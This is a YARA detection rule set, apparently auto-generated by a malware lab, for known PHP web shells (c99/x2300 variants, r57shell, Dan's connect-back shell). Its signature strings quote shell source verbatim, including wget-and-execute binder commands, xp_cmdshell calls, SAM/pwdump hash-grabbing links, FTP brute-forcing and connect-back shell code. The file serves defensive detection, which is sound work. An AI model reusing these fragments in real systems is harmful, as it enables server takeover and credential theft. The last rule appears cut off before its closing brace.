/*
   YARA Rule Set
   Author: Comps Team Malware Lab
   Date: 2026-03-02
   Identifier: php__loose__other
   Reference: php__loose__other php_mixed auto gen
*/

/* Rule Set ----------------------------------------------------------------- */

rule backdoor_php_sniperxcode__1dd8b331cf4c {
   meta:
      description = "php__loose__other - file backdoor_php_sniperxcode__1dd8b331cf4c"
      author = "Comps Team Malware Lab"
      reference = "php__loose__other php_mixed auto gen"
      date = "2026-03-02"
      hash1 = "1dd8b331cf4ce80ded539435b7084bcbb034fd06da5ba690f8e9cd6e65ddcbdc"
   strings:
      $x1 = "if (!preg_match($s,getenv(\"REMOTE_ADDR\")) and !preg_match($s,gethostbyaddr(getenv(\"REMOTE_ADDR\")))) {exit(\"<a href=\\\"http" ascii /* score: '46.00'*/
      $x2 = "erxcode.com/\\\">x2300 Shell</a>: Access Denied - your host (\".getenv(\"REMOTE_ADDR\").\") not allow\");} " fullword ascii /* score: '46.00'*/
      $x3 = "?><html><head><meta http-equiv=\"Content-Type\" content=\"text/html; charset=windows-1251\"><meta http-equiv=\"Content-Language" ascii /* score: '45.00'*/
      $x4 = "if ($act == \"about\") {echo \"<center><b>Credits:<br>Idea, leading and coding by tristram[CCTeaM].<br>Beta-testing and some tip" ascii /* score: '39.00'*/
      $x5 = "echo '</td><td align=right><b>Server IP: <a href=http://whois.domaintools.com/'.gethostbyname($_SERVER[\"HTTP_HOST\"]).'>'.getho" ascii /* score: '38.00'*/
      $x6 = "    ?><table border=\"0\" width=\"100%\" height=\"1\"><tr><td width=\"30%\" height=\"1\"><b>Create new table:</b><form action=\"" ascii /* score: '35.00'*/
      $x7 = "echo '<a href=\"'.$surl.'act=grablogins&dumphashes=samdump\"><b>Execute SAMDUMP</b></a><br><br>';" fullword ascii /* score: '35.00'*/
      $x8 = "<tr><td>Code to inject: </td><td><textarea name=\"injectthis\" cols=50 rows=4><?php echo htmlspecialchars('<IFRAME src=\"http://" ascii /* score: '34.00'*/
      $x9 = "byname($_SERVER[\"HTTP_HOST\"]).'</a> - Your IP: <a href=http://whois.domaintools.com/'.$_SERVER[\"REMOTE_ADDR\"].'>'.$_SERVER[" ascii /* score: '33.00'*/
      $x10 = "*  added windows login hash grabber + sam/fg/pwdump2" fullword ascii /* score: '33.00'*/
      $x11 = "*  removed fgdump (no need for three programs that do the same f-ing thing :P) !!! 1 mb saved !!!" fullword ascii /* score: '31.00'*/
      $x12 = "echo '<a href=\"'.$surl.'act=grablogins&dumphashes=pwdump2\"><b>Execute PWDUMP2</b></a><br><br>';" fullword ascii /* score: '31.00'*/
      $x13 = "  echo \"<center><b>MySQL \".mysql_get_server_info().\" (proto v.\".mysql_get_proto_info ().\") running in \".htmlspecialchars($" ascii /* score: '31.00'*/
      $s14 = " displaysecinfo(\"Kernel version?\",myshellexec(\"sysctl -a | grep version\")); " fullword ascii /* score: '30.00'*/
      $s15 = " if (file_get_contents(\"/var/cpanel/accounting.log\")) {echo \"<b><font color=green><a href=\\\"\".$surl.\"act=f&f=accounting.l" ascii /* score: '29.00'*/
      $s16 = " if (file_get_contents(\"/var/cpanel/accounting.log\")) {echo \"<b><font color=green><a href=\\\"\".$surl.\"act=f&f=accounting.l" ascii /* score: '29.00'*/
      $s17 = "myshellexec(\"wget $adires -O sayko_bind;chmod 777 sayko_bind;./sayko_bind\"); " fullword ascii /* score: '29.00'*/
      $s18 = "myshellexec(\"lynx -dump $adires > sayko_bind;chmod 777 sayko_bind;./sayko_bind\"); " fullword ascii /* score: '29.00'*/
      $s19 = "  $file = $tmpdir.\"dump_\".getenv(\"SERVER_NAME\").\"_\".$db.\"_\".date(\"d-m-Y-H-i-s\").\".sql\"; " fullword ascii /* score: '29.00'*/
      $s20 = "<form target=\"_blank\" action=\"http://www.md5encryption.com/?mod=decrypt\" method=POST>" fullword ascii /* score: '29.00'*/
   condition:
      uint16(0) == 0x3f3c and filesize < 2000KB and
      1 of ($x*) and all of them
}

rule backdoor_php_ange78_b__aa7403fb0408 {
   meta:
      description = "php__loose__other - file backdoor_php_ange78_b__aa7403fb0408"
      author = "Comps Team Malware Lab"
      reference = "php__loose__other php_mixed auto gen"
      date = "2026-03-02"
      hash1 = "aa7403fb0408e4164dad01b723a0376eb74683893dffb8764100c63291b2851b"
   strings:
      $x1 = "s7s.com/\\\">x2300 Shell</a>: Access Denied - your host (\".getenv(\"REMOTE_ADDR\").\") not allow\");} " fullword ascii /* score: '46.00'*/
      $x2 = "if (!preg_match($s,getenv(\"REMOTE_ADDR\")) and !preg_match($s,gethostbyaddr(getenv(\"REMOTE_ADDR\")))) {exit(\"<a href=\\\"http" ascii /* score: '46.00'*/
      $x3 = "?><html><head><meta http-equiv=\"Content-Type\" content=\"text/html; charset=windows-1251\"><meta http-equiv=\"Content-Language" ascii /* score: '43.00'*/
      $x4 = "if ($act == \"about\") {echo \"<center><b>Credits:<br>Idea, leading and coding by tristram[CCTeaM].<br>Beta-testing and some tip" ascii /* score: '39.00'*/
      $x5 = "echo '</td><td align=right><b>Server IP: <a href=http://whois.domaintools.com/'.gethostbyname($_SERVER[\"HTTP_HOST\"]).'>'.getho" ascii /* score: '38.00'*/
      $x6 = "    ?><table border=\"0\" width=\"100%\" height=\"1\"><tr><td width=\"30%\" height=\"1\"><b>Create new table:</b><form action=\"" ascii /* score: '35.00'*/
      $x7 = "echo '<a href=\"'.$surl.'act=grablogins&dumphashes=samdump\"><b>Execute SAMDUMP</b></a><br><br>';" fullword ascii /* score: '35.00'*/
      $x8 = "<tr><td>Code to inject: </td><td><textarea name=\"injectthis\" cols=50 rows=4><?php echo htmlspecialchars('<IFRAME src=\"http://" ascii /* score: '34.00'*/
      $x9 = "byname($_SERVER[\"HTTP_HOST\"]).'</a> - Your IP: <a href=http://whois.domaintools.com/'.$_SERVER[\"REMOTE_ADDR\"].'>'.$_SERVER[" ascii /* score: '33.00'*/
      $x10 = "*  added windows login hash grabber + sam/fg/pwdump2" fullword ascii /* score: '33.00'*/
      $x11 = "*  removed fgdump (no need for three programs that do the same f-ing thing :P) !!! 1 mb saved !!!" fullword ascii /* score: '31.00'*/
      $x12 = "echo '<a href=\"'.$surl.'act=grablogins&dumphashes=pwdump2\"><b>Execute PWDUMP2</b></a><br><br>';" fullword ascii /* score: '31.00'*/
      $x13 = "  echo \"<center><b>MySQL \".mysql_get_server_info().\" (proto v.\".mysql_get_proto_info ().\") running in \".htmlspecialchars($" ascii /* score: '31.00'*/
      $x14 = "<br><TABLE style=\"BORDER-COLLAPSE: collapse\" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=0 width=\"100%\" bgcol" ascii /* score: '31.00'*/
      $s15 = " displaysecinfo(\"Kernel version?\",myshellexec(\"sysctl -a | grep version\")); " fullword ascii /* score: '30.00'*/
      $s16 = "ent=\"en-us\"><title><?php echo getenv(\"HTTP_HOST\"); ?> - ANGE78Shell</title><STYLE>TD { FONT-SIZE: 8pt; COLOR: #cc7700; FONT-" ascii /* score: '30.00'*/
      $s17 = " if (file_get_contents(\"/var/cpanel/accounting.log\")) {echo \"<b><font color=green><a href=\\\"\".$surl.\"act=f&f=accounting.l" ascii /* score: '29.00'*/
      $s18 = " if (file_get_contents(\"/var/cpanel/accounting.log\")) {echo \"<b><font color=green><a href=\\\"\".$surl.\"act=f&f=accounting.l" ascii /* score: '29.00'*/
      $s19 = "myshellexec(\"wget $adires -O sayko_bind;chmod 777 sayko_bind;./sayko_bind\"); " fullword ascii /* score: '29.00'*/
      $s20 = "myshellexec(\"lynx -dump $adires > sayko_bind;chmod 777 sayko_bind;./sayko_bind\"); " fullword ascii /* score: '29.00'*/
   condition:
      uint16(0) == 0x3f3c and filesize < 2000KB and
      1 of ($x*) and all of them
}

rule backdoor_php_andika_a__dc9fa237a8c1 {
   meta:
      description = "php__loose__other - file backdoor_php_andika_a__dc9fa237a8c1"
      author = "Comps Team Malware Lab"
      reference = "php__loose__other php_mixed auto gen"
      date = "2026-03-02"
      hash1 = "dc9fa237a8c141ee598d532b3dbd79bd550d7c7e4c630ac3fab2e4f8690fa9b5"
   strings:
      $s1 = "echo (!empty($_POST['php_eval'])?($_POST['php_eval']):(\"/* delete script */\\r\\n//unlink(\\\"r57shell.php\\\");\\r\\n//readfil" ascii /* score: '27.00'*/
      $s2 = "'eng_text71'=>\"Second commands param is:\\r\\n- for CHOWN - name of new owner or UID\\r\\n- for CHGRP - group name or GID\\r\\n" ascii /* score: '26.00'*/
      $s3 = "if ($_POST['cmd']==\"mysql_dump\")" fullword ascii /* score: '24.00'*/
      $s4 = "else if(($_POST['cmd']!=\"php_eval\")&&($_POST['cmd']!=\"mysql_dump\")&&($_POST['cmd']!=\"db_show\")&&($_POST['cmd']!=\"db_query" ascii /* score: '24.00'*/
      $s5 = "echo (!empty($_POST['php_eval'])?($_POST['php_eval']):(\"/* delete script */\\r\\n//unlink(\\\"r57shell.php\\\");\\r\\n//readfil" ascii /* score: '24.00'*/
      $s6 = "     @mssql_query(\"insert into r57_temp_table EXEC master.dbo.xp_cmdshell '\".$_POST['test4_file'].\"'\",$db);" fullword ascii /* score: '24.00'*/
      $s7 = "     $sql1  = \"# PostgreSQL dump created by r57shell\\r\\n\";" fullword ascii /* score: '23.00'*/
      $s8 = "echo sr(15,\"<b>\".$lang[$language.'_text36'].$arrow.\"</b>\",in('text','test3_md',15,(!empty($_POST['test3_md'])?($_POST['test3" ascii /* score: '23.00'*/
      $s9 = " $_POST['cmd'] = which('fetch').\" -p \".$_POST['rem_file'].\" -o \".$_POST['loc_file'].\"\";" fullword ascii /* score: '22.00'*/
      $s10 = "echo sr(45,\"<b>\".$lang[$language.'_text59'].$arrow.\"</b>\",in('text','dif_name',15,(!empty($_POST['dif_name'])?($_POST['dif_n" ascii /* score: '22.00'*/
      $s11 = " else if(!empty($_POST['dif'])&&!$fp) { echo \"[-] ERROR! Can't write in dump file\"; }" fullword ascii /* score: '22.00'*/
      $s12 = " $_POST['cmd'] = which('curl').\" \".$_POST['rem_file'].\" -o \".$_POST['loc_file'].\"\";" fullword ascii /* score: '22.00'*/
      $s13 = "  $str = \"host='localhost' port='\".$_POST['db_port'].\"' user='\".$_POST['mysql_l'].\"' password='\".$_POST['mysql_p'].\"' dbn" ascii /* score: '21.00'*/
      $s14 = "  $str = \"host='localhost' port='\".$_POST['db_port'].\"' user='\".$_POST['mysql_l'].\"' password='\".$_POST['mysql_p'].\"' dbn" ascii /* score: '21.00'*/
      $s15 = "'eng_text71'=>\"Second commands param is:\\r\\n- for CHOWN - name of new owner or UID\\r\\n- for CHGRP - group name or GID\\r\\n" ascii /* score: '21.00'*/
      $s16 = "echo sr(15,\"<b>\".$lang[$language.'_text55'].$arrow.\"</b>\",in('checkbox','m id=m',0,'1').in('text','s_mask',82,'.txt;.php')." ascii /* score: '20.00'*/
      $s17 = "echo sr(15,\"<b>\".$lang[$language.'_text36'].$arrow.\"</b>\",in('text','test4_md',15,(!empty($_POST['test4_md'])?($_POST['test4" ascii /* score: '20.00'*/
      $s18 = "?($_POST['test3_mp']):(\"password\"))).ws(4).\"<b>\".$lang[$language.'_text14'].$arrow.\"</b>\".in('text','test3_port',15,(!empt" ascii /* score: '20.00'*/
      $s19 = "($_POST['test4_mp']):(\"password\"))).ws(4).\"<b>\".$lang[$language.'_text14'].$arrow.\"</b>\".in('text','test4_port',15,(!empty" ascii /* score: '20.00'*/
      $s20 = " $blah = ex($p2.\" /tmp/dp \".$_POST['local_port'].\" \".$_POST['remote_host'].\" \".$_POST['remote_port'].\" &\");" fullword ascii /* score: '20.00'*/
   condition:
      uint16(0) == 0x3f3c and filesize < 300KB and
      8 of them
}

rule backdoor_php_edloco_a__23490ca429b3 {
   meta:
      description = "php__loose__other - file backdoor_php_edloco_a__23490ca429b3"
      author = "Comps Team Malware Lab"
      reference = "php__loose__other php_mixed auto gen"
      date = "2026-03-02"
      hash1 = "23490ca429b3ddefdc9d875235e8840f4f9295993b1f2aa765692733cf080c17"
   strings:
      $s1 = "echo (!empty($_POST['php_eval'])?($_POST['php_eval']):(\"/* delete script */\\r\\n//unlink(\\\"r57shell.php\\\");\\r\\n//readfil" ascii /* score: '27.00'*/
      $s2 = "'eng_text71'=>\"Second commands param is:\\r\\n- for CHOWN - name of new owner or UID\\r\\n- for CHGRP - group name or GID\\r\\n" ascii /* score: '26.00'*/
      $s3 = "if ($_POST['cmd']==\"mysql_dump\")" fullword ascii /* score: '24.00'*/
      $s4 = "else if(($_POST['cmd']!=\"php_eval\")&&($_POST['cmd']!=\"mysql_dump\")&&($_POST['cmd']!=\"db_show\")&&($_POST['cmd']!=\"db_query" ascii /* score: '24.00'*/
      $s5 = "echo (!empty($_POST['php_eval'])?($_POST['php_eval']):(\"/* delete script */\\r\\n//unlink(\\\"r57shell.php\\\");\\r\\n//readfil" ascii /* score: '24.00'*/
      $s6 = "     @mssql_query(\"insert into r57_temp_table EXEC master.dbo.xp_cmdshell '\".$_POST['test4_file'].\"'\",$db);" fullword ascii /* score: '24.00'*/
      $s7 = "     $sql1  = \"# PostgreSQL dump created by r57shell\\r\\n\";" fullword ascii /* score: '23.00'*/
      $s8 = "echo sr(15,\"<b>\".$lang[$language.'_text36'].$arrow.\"</b>\",in('text','test3_md',15,(!empty($_POST['test3_md'])?($_POST['test3" ascii /* score: '23.00'*/
      $s9 = " $_POST['cmd'] = which('fetch').\" -p \".$_POST['rem_file'].\" -o \".$_POST['loc_file'].\"\";" fullword ascii /* score: '22.00'*/
      $s10 = "echo sr(45,\"<b>\".$lang[$language.'_text59'].$arrow.\"</b>\",in('text','dif_name',15,(!empty($_POST['dif_name'])?($_POST['dif_n" ascii /* score: '22.00'*/
      $s11 = " else if(!empty($_POST['dif'])&&!$fp) { echo \"[-] ERROR! Can't write in dump file\"; }" fullword ascii /* score: '22.00'*/
      $s12 = " $_POST['cmd'] = which('curl').\" \".$_POST['rem_file'].\" -o \".$_POST['loc_file'].\"\";" fullword ascii /* score: '22.00'*/
      $s13 = "  $str = \"host='localhost' port='\".$_POST['db_port'].\"' user='\".$_POST['mysql_l'].\"' password='\".$_POST['mysql_p'].\"' dbn" ascii /* score: '21.00'*/
      $s14 = "  $str = \"host='localhost' port='\".$_POST['db_port'].\"' user='\".$_POST['mysql_l'].\"' password='\".$_POST['mysql_p'].\"' dbn" ascii /* score: '21.00'*/
      $s15 = "'eng_text71'=>\"Second commands param is:\\r\\n- for CHOWN - name of new owner or UID\\r\\n- for CHGRP - group name or GID\\r\\n" ascii /* score: '21.00'*/
      $s16 = "echo sr(15,\"<b>\".$lang[$language.'_text55'].$arrow.\"</b>\",in('checkbox','m id=m',0,'1').in('text','s_mask',82,'.txt;.php')." ascii /* score: '20.00'*/
      $s17 = "echo sr(15,\"<b>\".$lang[$language.'_text36'].$arrow.\"</b>\",in('text','test4_md',15,(!empty($_POST['test4_md'])?($_POST['test4" ascii /* score: '20.00'*/
      $s18 = "?($_POST['test3_mp']):(\"password\"))).ws(4).\"<b>\".$lang[$language.'_text14'].$arrow.\"</b>\".in('text','test3_port',15,(!empt" ascii /* score: '20.00'*/
      $s19 = "($_POST['test4_mp']):(\"password\"))).ws(4).\"<b>\".$lang[$language.'_text14'].$arrow.\"</b>\".in('text','test4_port',15,(!empty" ascii /* score: '20.00'*/
      $s20 = " $blah = ex($p2.\" /tmp/dp \".$_POST['local_port'].\" \".$_POST['remote_host'].\" \".$_POST['remote_port'].\" &\");" fullword ascii /* score: '20.00'*/
   condition:
      uint16(0) == 0x3f3c and filesize < 300KB and
      8 of them
}

rule backdoor_php_dansshell__051ed0017b8e {
   meta:
      description = "php__loose__other - file backdoor_php_dansshell__051ed0017b8e"
      author = "Comps Team Malware Lab"
      reference = "php__loose__other php_mixed auto gen"
      date = "2026-03-02"
      hash1 = "051ed0017b8ecbda062ea9c308484dfb92432a69e5766715df5d2e56205a2afe"
   strings:
      $s1 = "elseif(@is_writable($FN) && @is_file($FN)) $tmpOutMF .=  \"<font color=red>$owner - $perms - <a target='_parent' href='$MyLoc?$S" ascii /* score: '28.00'*/
      $s2 = "if(@is_writable($FN) && @is_dir($FN))  $tmpOutMF .=  \"<font color=red>$owner - $perms - <a target='_parent' href='$MyLoc?$SREQ&" ascii /* score: '28.00'*/
      $s3 = "# dump variables (DEBUG SCRIPT) NEEDS MODIFINY FOR B64 STATUS!!" fullword ascii /* score: '28.00'*/
      $s4 = "elseif(@is_writable($FN) && @is_file($FN)) $tmpOutMF .=  \"<font color=red>$owner - $perms - <a target='_parent' href='$MyLoc?$S" ascii /* score: '28.00'*/
      $s5 = "if(@is_writable($FN) && @is_dir($FN))  $tmpOutMF .=  \"<font color=red>$owner - $perms - <a target='_parent' href='$MyLoc?$SREQ&" ascii /* score: '28.00'*/
      $s6 = "ini_set(\"user_agent\",\"m0ins downloader\");" fullword ascii /* score: '27.00'*/
      $s7 = "drop_syslog_warning(\"Q: $QUERY_STRING :: R: $REMOTE_ADDR ($HTTP_USER_AGENT)\");" fullword ascii /* score: '25.00'*/
      $s8 = "if($run == 1 && $cbtempdir && $cbcompiler && $cbhost && $cbport) $strOutput .= connect_back($cbtempdir, $cbcompiler, $cbhost, $c" ascii /* score: '25.00'*/
      $s9 = "if($run == 1 && $cbtempdir && $cbcompiler && $cbhost && $cbport) $strOutput .= connect_back($cbtempdir, $cbcompiler, $cbhost, $c" ascii /* score: '25.00'*/
      $s10 = "elseif(@is_file($FN)) $tmpOutMF .=  \"<font color=green>$owner - $perms - <a target='_parent' href='$MyLoc?$SREQ&snoop=0&vsource" ascii /* score: '25.00'*/
      $s11 = "elseif(@is_file($FN)) $tmpOutMF .=  \"<font color=green>$owner - $perms - <a target='_parent' href='$MyLoc?$SREQ&snoop=0&vsource" ascii /* score: '25.00'*/
      $s12 = "elseif(@is_dir($FN))  $tmpOutMF .=  \"<font color=blue>$owner - $perms - <a target='_parent' href='$MyLoc?$SREQ&chdir=$FN'>$file" ascii /* score: '25.00'*/
      $s13 = "elseif(@is_dir($FN))  $tmpOutMF .=  \"<font color=blue>$owner - $perms - <a target='_parent' href='$MyLoc?$SREQ&chdir=$FN'>$file" ascii /* score: '25.00'*/
      $s14 = "# Dan's PHP Connect Back / Port Binding Shell!" fullword ascii /* score: '24.00'*/
      $s15 = "# execute cmd shell NEEDS MODIFINY FOR B64 STATUS!!" fullword ascii /* score: '24.00'*/
      $s16 = "$process = proc_open($shell, $descriptorspec, $pipes);" fullword ascii /* score: '23.00'*/
      $s17 = "function DB_Shell($type, $shell, $port, $host = \"0.0.0.0\") {" fullword ascii /* score: '22.00'*/
      $s18 = "$strOutput .= \"<table border=1><tr><td colspan=2><h3>execute cmd execution: \" . $cmdcall . \"</h3></td></tr>" fullword ascii /* score: '22.00'*/
      $s19 = "# dump variables" fullword ascii /* score: '22.00'*/
      $s20 = "if($run == 1 && $phpshellapp && $phpshellhost && $phpshellport) $strOutput .= DB_Shell($phpshelltype, $phpshellapp, $phpshellpor" ascii /* score: '20.00'*/
   condition:
      uint16(0) == 0x3f3c and filesize < 100KB and
      8 of them
}

/* Super Rules ------------------------------------------------------------- */

rule _backdoor_php_sniperxcode__1dd8b331cf4c_backdoor_php_ange78_b__aa7403fb0408_0 {
   meta:
      description = "php__loose__other - from files backdoor_php_sniperxcode__1dd8b331cf4c, backdoor_php_ange78_b__aa7403fb0408"
      author = "Comps Team Malware Lab"
      reference = "php__loose__other php_mixed auto gen"
      date = "2026-03-02"
      hash1 = "1dd8b331cf4ce80ded539435b7084bcbb034fd06da5ba690f8e9cd6e65ddcbdc"
      hash2 = "aa7403fb0408e4164dad01b723a0376eb74683893dffb8764100c63291b2851b"
   strings:
      $x1 = "if ($act == \"about\") {echo \"<center><b>Credits:<br>Idea, leading and coding by tristram[CCTeaM].<br>Beta-testing and some tip" ascii /* score: '39.00'*/
      $x2 = "echo '</td><td align=right><b>Server IP: <a href=http://whois.domaintools.com/'.gethostbyname($_SERVER[\"HTTP_HOST\"]).'>'.getho" ascii /* score: '38.00'*/
      $x3 = "    ?><table border=\"0\" width=\"100%\" height=\"1\"><tr><td width=\"30%\" height=\"1\"><b>Create new table:</b><form action=\"" ascii /* score: '35.00'*/
      $x4 = "echo '<a href=\"'.$surl.'act=grablogins&dumphashes=samdump\"><b>Execute SAMDUMP</b></a><br><br>';" fullword ascii /* score: '35.00'*/
      $x5 = "<tr><td>Code to inject: </td><td><textarea name=\"injectthis\" cols=50 rows=4><?php echo htmlspecialchars('<IFRAME src=\"http://" ascii /* score: '34.00'*/
      $x6 = "byname($_SERVER[\"HTTP_HOST\"]).'</a> - Your IP: <a href=http://whois.domaintools.com/'.$_SERVER[\"REMOTE_ADDR\"].'>'.$_SERVER[" ascii /* score: '33.00'*/
      $x7 = "*  added windows login hash grabber + sam/fg/pwdump2" fullword ascii /* score: '33.00'*/
      $x8 = "*  removed fgdump (no need for three programs that do the same f-ing thing :P) !!! 1 mb saved !!!" fullword ascii /* score: '31.00'*/
      $x9 = "echo '<a href=\"'.$surl.'act=grablogins&dumphashes=pwdump2\"><b>Execute PWDUMP2</b></a><br><br>';" fullword ascii /* score: '31.00'*/
      $x10 = "  echo \"<center><b>MySQL \".mysql_get_server_info().\" (proto v.\".mysql_get_proto_info ().\") running in \".htmlspecialchars($" ascii /* score: '31.00'*/
      $s11 = " displaysecinfo(\"Kernel version?\",myshellexec(\"sysctl -a | grep version\")); " fullword ascii /* score: '30.00'*/
      $s12 = " if (file_get_contents(\"/var/cpanel/accounting.log\")) {echo \"<b><font color=green><a href=\\\"\".$surl.\"act=f&f=accounting.l" ascii /* score: '29.00'*/
      $s13 = " if (file_get_contents(\"/var/cpanel/accounting.log\")) {echo \"<b><font color=green><a href=\\\"\".$surl.\"act=f&f=accounting.l" ascii /* score: '29.00'*/
      $s14 = "myshellexec(\"wget $adires -O sayko_bind;chmod 777 sayko_bind;./sayko_bind\"); " fullword ascii /* score: '29.00'*/
      $s15 = "myshellexec(\"lynx -dump $adires > sayko_bind;chmod 777 sayko_bind;./sayko_bind\"); " fullword ascii /* score: '29.00'*/
      $s16 = "  $file = $tmpdir.\"dump_\".getenv(\"SERVER_NAME\").\"_\".$db.\"_\".date(\"d-m-Y-H-i-s\").\".sql\"; " fullword ascii /* score: '29.00'*/
      $s17 = "<form target=\"_blank\" action=\"http://www.md5encryption.com/?mod=decrypt\" method=POST>" fullword ascii /* score: '29.00'*/
      $s18 = "     echo \"<form method=\\\"GET\\\"><input type=\\\"hidden\\\" name=\\\"act\\\" value=\\\"sql\\\"><input type=\\\"hidden\\\" na" ascii /* score: '28.00'*/
      $s19 = "  function c99ftpbrutecheck($host,$port,$timeout,$login,$pass,$sh,$fqb_onlywithsh) " fullword ascii /* score: '28.00'*/
      $s20 = "m/scripts/contact.dll?msgto=656555\\\"><img src=\\\"http://wwp.icq.com/scripts/online.dll?icq=656555&img=5\\\" border=0 align=ab" ascii /* score: '28.00'*/
   condition:
      ( uint16(0) == 0x3f3c and filesize < 2000KB and ( 1 of ($x*) and all of them )
      ) or ( all of them )
}

rule _backdoor_php_andika_a__dc9fa237a8c1_backdoor_php_edloco_a__23490ca429b3_1 {
   meta:
      description = "php__loose__other - from files backdoor_php_andika_a__dc9fa237a8c1, backdoor_php_edloco_a__23490ca429b3"
      author = "Comps Team Malware Lab"
      reference = "php__loose__other php_mixed auto gen"
      date = "2026-03-02"
      hash1 = "dc9fa237a8c141ee598d532b3dbd79bd550d7c7e4c630ac3fab2e4f8690fa9b5"
      hash2 = "23490ca429b3ddefdc9d875235e8840f4f9295993b1f2aa765692733cf080c17"
   strings:
      $s1 = "echo (!empty($_POST['php_eval'])?($_POST['php_eval']):(\"/* delete script */\\r\\n//unlink(\\\"r57shell.php\\\");\\r\\n//readfil" ascii /* score: '27.00'*/
      $s2 = "'eng_text71'=>\"Second commands param is:\\r\\n- for CHOWN - name of new owner or UID\\r\\n- for CHGRP - group name or GID\\r\\n" ascii /* score: '26.00'*/
      $s3 = "if ($_POST['cmd']==\"mysql_dump\")" fullword ascii /* score: '24.00'*/
      $s4 = "else if(($_POST['cmd']!=\"php_eval\")&&($_POST['cmd']!=\"mysql_dump\")&&($_POST['cmd']!=\"db_show\")&&($_POST['cmd']!=\"db_query" ascii /* score: '24.00'*/
      $s5 = "echo (!empty($_POST['php_eval'])?($_POST['php_eval']):(\"/* delete script */\\r\\n//unlink(\\\"r57shell.php\\\");\\r\\n//readfil" ascii /* score: '24.00'*/
      $s6 = "     @mssql_query(\"insert into r57_temp_table EXEC master.dbo.xp_cmdshell '\".$_POST['test4_file'].\"'\",$db);" fullword ascii /* score: '24.00'*/
      $s7 = "     $sql1  = \"# PostgreSQL dump created by r57shell\\r\\n\";" fullword ascii /* score: '23.00'*/
      $s8 = "echo sr(15,\"<b>\".$lang[$language.'_text36'].$arrow.\"</b>\",in('text','test3_md',15,(!empty($_POST['test3_md'])?($_POST['test3" ascii /* score: '23.00'*/
      $s9 = " $_POST['cmd'] = which('fetch').\" -p \".$_POST['rem_file'].\" -o \".$_POST['loc_file'].\"\";" fullword ascii /* score: '22.00'*/
      $s10 = "echo sr(45,\"<b>\".$lang[$language.'_text59'].$arrow.\"</b>\",in('text','dif_name',15,(!empty($_POST['dif_name'])?($_POST['dif_n" ascii /* score: '22.00'*/
      $s11 = " else if(!empty($_POST['dif'])&&!$fp) { echo \"[-] ERROR! Can't write in dump file\"; }" fullword ascii /* score: '22.00'*/
      $s12 = " $_POST['cmd'] = which('curl').\" \".$_POST['rem_file'].\" -o \".$_POST['loc_file'].\"\";" fullword ascii /* score: '22.00'*/
      $s13 = "  $str = \"host='localhost' port='\".$_POST['db_port'].\"' user='\".$_POST['mysql_l'].\"' password='\".$_POST['mysql_p'].\"' dbn" ascii /* score: '21.00'*/
      $s14 = "  $str = \"host='localhost' port='\".$_POST['db_port'].\"' user='\".$_POST['mysql_l'].\"' password='\".$_POST['mysql_p'].\"' dbn" ascii /* score: '21.00'*/
      $s15 = "'eng_text71'=>\"Second commands param is:\\r\\n- for CHOWN - name of new owner or UID\\r\\n- for CHGRP - group name or GID\\r\\n" ascii /* score: '21.00'*/
      $s16 = "echo sr(15,\"<b>\".$lang[$language.'_text55'].$arrow.\"</b>\",in('checkbox','m id=m',0,'1').in('text','s_mask',82,'.txt;.php')." ascii /* score: '20.00'*/
      $s17 = "echo sr(15,\"<b>\".$lang[$language.'_text36'].$arrow.\"</b>\",in('text','test4_md',15,(!empty($_POST['test4_md'])?($_POST['test4" ascii /* score: '20.00'*/
      $s18 = "?($_POST['test3_mp']):(\"password\"))).ws(4).\"<b>\".$lang[$language.'_text14'].$arrow.\"</b>\".in('text','test3_port',15,(!empt" ascii /* score: '20.00'*/
      $s19 = "($_POST['test4_mp']):(\"password\"))).ws(4).\"<b>\".$lang[$language.'_text14'].$arrow.\"</b>\".in('text','test4_port',15,(!empty" ascii /* score: '20.00'*/
      $s20 = " $blah = ex($p2.\" /tmp/dp \".$_POST['local_port'].\" \".$_POST['remote_host'].\" \".$_POST['remote_port'].\" &\");" fullword ascii /* score: '20.00'*/
   condition:
      ( uint16(0) == 0x3f3c and filesize < 300KB and ( 8 of them )
      ) or ( all of them )
}

rule _backdoor_php_sniperxcode__1dd8b331cf4c_backdoor_php_ange78_b__aa7403fb0408_backdoor_php_andika_a__dc9fa237a8c1_backdoor_php_2 {
   meta:
      description = "php__loose__other - from files backdoor_php_sniperxcode__1dd8b331cf4c, backdoor_php_ange78_b__aa7403fb0408, backdoor_php_andika_a__dc9fa237a8c1, backdoor_php_edloco_a__23490ca429b3"
      author = "Comps Team Malware Lab"
      reference = "php__loose__other php_mixed auto gen"
      date = "2026-03-02"
      hash1 = "1dd8b331cf4ce80ded539435b7084bcbb034fd06da5ba690f8e9cd6e65ddcbdc"
      hash2 = "aa7403fb0408e4164dad01b723a0376eb74683893dffb8764100c63291b2851b"
      hash3 = "dc9fa237a8c141ee598d532b3dbd79bd550d7c7e4c630ac3fab2e4f8690fa9b5"
      hash4 = "23490ca429b3ddefdc9d875235e8840f4f9295993b1f2aa765692733cf080c17"
   strings:
      $s1 = "  elseif(function_exists('shell_exec'))" fullword ascii /* score: '14.00'*/
      $s2 = "  if(function_exists('exec'))" fullword ascii /* score: '12.00'*/
      $s3 = "    $res = @shell_exec($cfe);" fullword ascii /* score: '9.00'*/
      $s4 = "    $res = @ob_get_contents();" fullword ascii /* score: '9.00'*/
      $s5 = "    @exec($cfe,$res);" fullword ascii /* score: '7.00'*/
      $s6 = "  elseif(function_exists('passthru'))" fullword ascii /* score: '7.00'*/
      $s7 = "  elseif(function_exists('system'))" fullword ascii /* score: '7.00'*/
      $s8 = " cf(\"/tmp/back\",$back_connect);" fullword ascii /* score: '7.00'*/
      $s9 = " @fputs($w_file,@base64_decode($text));" fullword ascii /* score: '6.00'*/
      $s10 = " return $res;" fullword ascii /* score: '4.00'*/
      $s11 = "if(!empty($path)) { return $path; } else { return $pr; }" fullword ascii /* score: '4.00'*/
      $s12 = " $p2=which(\"perl\");" fullword ascii /* score: '4.00'*/
      $s13 = "$path = ex(\"which $pr\");" fullword ascii /* score: '4.00'*/
      $s14 = "  elseif(@is_resource($f = @popen($cfe,\"r\")))" fullword ascii /* score: '4.00'*/
      $s15 = "function which($pr)" fullword ascii /* score: '4.00'*/
      $s16 = " @fclose($w_file);" fullword ascii /* score: '4.00'*/
      $s17 = " if (!empty($cfe))" fullword ascii /* score: '4.00'*/
      $s18 = "function ex($cfe)" fullword ascii /* score: '4.00'*/
      $s19 = "function cf($fname,$text)" fullword ascii /* score: '4.00'*/
      $s20 = "   while(!@feof($f)) { $res .= @fread($f,1024); }" fullword ascii /* score: '2.00'*/
   condition:
      ( uint16(0) == 0x3f3c and filesize < 2000KB and ( 8 of them )
      ) or ( all of them )
